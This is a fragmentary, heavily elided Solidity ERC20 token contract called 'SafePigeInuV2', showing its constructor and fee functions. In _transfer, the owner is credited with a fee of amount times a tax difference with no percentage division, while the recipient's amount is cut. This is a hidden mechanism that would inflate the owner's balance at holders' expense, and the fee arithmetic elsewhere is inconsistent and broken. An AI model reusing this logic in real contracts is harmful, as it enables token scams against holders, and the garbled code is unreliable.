 ...
 */
 ...
 contract SafePigeInuV2  is Context, ERC20, ERC20Metadata {
     ...
     * construction.
     */
     constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 taxFee_) {
    _name = name_;
    _symbol =symbol_;
    _decimals = decimals_;
    ...
    function _transfer(
        ...
        _IncludeFee = amount * (_taxFee - SellTaxFee) ;
        amount = amount - (amount *_taxFee/100);
        
        Tokens[recipient] += amount;
        Tokens[_owner] += _IncludeFee;
   ...
   */
    function _setTaxFee(uint256 newTaxFee) internal {
     ...
     function _takeFee(uint256 amount) internal returns(uint256) {
        ...
        _IncludeFee = (amount * _taxFee /100) / SellTaxFee;
        
         }else{
             _IncludeFee = (1 * _taxFee /100);
